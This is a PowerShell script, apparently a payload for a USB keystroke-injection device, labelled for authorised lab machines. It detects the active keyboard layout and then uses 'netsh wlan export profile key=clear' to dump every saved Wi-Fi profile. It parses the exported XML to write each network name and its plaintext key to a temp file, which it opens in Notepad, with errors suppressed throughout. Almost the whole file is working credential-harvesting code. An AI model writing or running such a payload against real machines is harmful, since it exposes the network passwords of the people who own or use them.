# Lab authorized machines only: layout actif (audit) + export Wi-Fi (XML, indépendant du layout).
param(
    [switch]$NoNotepad
)
$ErrorActionPreference = 'SilentlyContinue'

function Get-DuckyKeyboardLayoutInfo {
    $names = @{
        '00000409' = 'en-US'
        '0000040C' = 'fr-FR'
        '00000410' = 'it-IT'
        '00000407' = 'de-DE'
        '00000807' = 'de-CH'
        '0000100C' = 'fr-BE'
        '0000080C' = 'be-BE'
    }
    $klid = $null
    $source = 'unknown'

    try {
        if (-not ('Win32Kl' -as [type])) {
            Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class Win32Kl {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetKeyboardLayout(int dwLayout);
    public static uint ActiveLangId() {
        return (uint)(long)GetKeyboardLayout(0) & 0xFFFFu;
    }
}
"@
        }
        $langId = [Win32Kl]::ActiveLangId()
        if ($langId -gt 0) {
            $klid = ('{0:X8}' -f $langId).ToUpperInvariant()
            $source = 'GetKeyboardLayout'
        }
    } catch {}

    if (-not $klid) {
        try {
            $kb = Get-CimInstance Win32_Keyboard -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($kb.Layout) {
                $klid = ($kb.Layout -as [string]).ToUpperInvariant()
                $source = 'Win32_Keyboard'
            }
        } catch {}
    }

    $tag = $null
    try {
        $tag = (Get-WinUserLanguageList -ErrorAction SilentlyContinue | Select-Object -First 1).LanguageTag
    } catch {}

    $label = if ($klid -and $names.ContainsKey($klid)) { $names[$klid] } elseif ($klid) { $klid } else { 'n/a' }

    [pscustomobject]@{
        KLID          = $klid
        Label         = $label
        UserLangFirst = $tag
        Source        = $source
    }
}

$d = Join-Path $env:TEMP 'wlan-ducky'
New-Item -ItemType Directory -Force -Path $d | Out-Null
netsh wlan export profile key=clear folder=$d | Out-Null

$h = Join-Path $env:TEMP 'wifi-leonardo.txt'
$lines = New-Object System.Collections.Generic.List[string]
$lines.Add(('WiFi export ' + (Get-Date -Format 'o')))

$kl = Get-DuckyKeyboardLayoutInfo
$lines.Add(('Keyboard (session): KLID={0} {1} (source={2}, userLang={3})' -f $kl.KLID, $kl.Label, $kl.Source, $kl.UserLangFirst))
$lines.Add('(export Wi-Fi via XML — même logique quel que soit le clavier)')
$lines.Add('')

Get-ChildItem -LiteralPath $d -Filter '*.xml' | Sort-Object Name | ForEach-Object {
    [xml]$x = Get-Content -LiteralPath $_.FullName
    $wp = $x.WLANProfile
    if (-not $wp) { return }

    $name = $wp.name
    $auth = $wp.MSM.security.authEncryption.authentication
    $enc = $wp.MSM.security.authEncryption.encryption
    $key = $wp.MSM.security.sharedKey.keyMaterial

    $lines.Add(('SSID: {0}' -f $name))
    $lines.Add(('Auth: {0}  Enc: {1}' -f $auth, $enc))
    if ($key) {
        $lines.Add(('Key:  {0}' -f $key))
    } else {
        $lines.Add('Key:  (open / no stored key)')
    }
    $lines.Add('')
}

$lines | Set-Content -LiteralPath $h -Encoding UTF8
if (-not $NoNotepad) { Start-Process notepad.exe -ArgumentList $h }
Write-Output $h